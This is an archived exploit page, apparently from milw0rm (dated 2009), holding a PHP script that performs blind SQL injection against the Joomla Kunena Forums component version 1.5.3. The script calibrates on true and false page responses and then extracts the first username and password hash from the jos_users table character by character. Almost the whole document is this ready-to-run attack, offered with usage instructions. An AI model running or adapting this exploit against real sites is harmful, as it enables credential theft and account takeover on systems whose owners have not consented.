<html><head><title>Joomla Component Kunena Forums (com_kunena) bSQL Injection Exploit</title></head><pre>&lt;?php
ini_set(&quot;max_execution_time&quot;,0);
print_r('
##############################################################################
#
#         Joomla Kunena Forums (func) Blind SQL Injection Exploit
#
#                          MEFISTO  a.k.a  ilkerkandemir
#                        mefisto [at] hackermail . com
#                            (IMT) imhatimi.org                          
#                         Usage: target.php [site][SQL]
#
##############################################################################
');
if ($argc &gt; 1) {
$url = $argv[1];
$r = strlen(file_get_contents($url.&quot;+and+1=1--&quot;));
echo &quot;\nExploiting:\n&quot;;
$w = strlen(file_get_contents($url.&quot;+and+1=0--&quot;));
$t = abs((100-($w/$r*100)));
echo &quot;Username: &quot;;
for ($i=1; $i &lt;= 30; $i++) {
$laenge = strlen(file_get_contents($url.&quot;+and+ascii(substring((select+username+from+jos_users+limit+0,1),&quot;.$i.&quot;,1))!=0--&quot;));
   if (abs((100-($laenge/$r*100))) &gt; $t-1) {
      $count = $i;
      $i = 30;
   }
}
for ($j = 1; $j &lt; $count; $j++) {
   for ($i = 46; $i &lt;= 122; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url.&quot;+and+ascii(substring((select+username+from+jos_users+limit+0,1),&quot;.$j.&quot;,1))%3E&quot;.$i.&quot;--&quot;));
      if (abs((100-($laenge/$r*100))) &gt; $t-1) {
         $laenge = strlen(file_get_contents($url.&quot;+and+ascii(substring((select+username+from+jos_users+limit+0,1),&quot;.$j.&quot;,1))%3E&quot;.($i-1).&quot;--&quot;));
         if (abs((100-($laenge/$r*100))) &gt; $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 122;
      }
   }
}
echo &quot;\nPassword: &quot;;
for ($j = 1; $j &lt;= 49; $j++) {
   for ($i = 46; $i &lt;= 102; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url.&quot;+and+ascii(substring((select+password+from+jos_users+limit+0,1),&quot;.$j.&quot;,1))%3E&quot;.$i.&quot;--&quot;));
      if (abs((100-($laenge/$r*100))) &gt; $t-1) {
         $laenge = strlen(file_get_contents($url.&quot;+and+ascii(substring((select+password+from+jos_users+limit+0,1),&quot;.$j.&quot;,1))%3E&quot;.($i-1).&quot;--&quot;));
         if (abs((100-($laenge/$r*100))) &gt; $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
        $i = 122;
      }
   }
}
} else {
echo &quot;\nExploiting Failed \n&quot;;
}

/*
Note:
&lt;name&gt;Kunena&lt;/name&gt;
&lt;version&gt;1.5.3&lt;/version&gt;
&lt;versionname&gt;Spreek&lt;/versionname&gt;
&lt;creationDate&gt;2009-06-15&lt;/creationDate&gt;
&lt;build&gt;1688&lt;/build&gt;
&lt;author&gt;www.Kunena.com&lt;/author&gt;
&lt;authorEmail&gt;Kunena@Kunena.com&lt;/authorEmail&gt;
&lt;authorUrl&gt;http://www.Kunena.com&lt;/authorUrl&gt;
&lt;copyright&gt;www.Kunena.com&lt;/copyright&gt;
&lt;license&gt;GNU/GPL&lt;/license&gt;
&lt;description&gt;Kunena Forum&lt;/description&gt;
*/
?&gt;

# milw0rm.com [2009-08-10]</pre></html>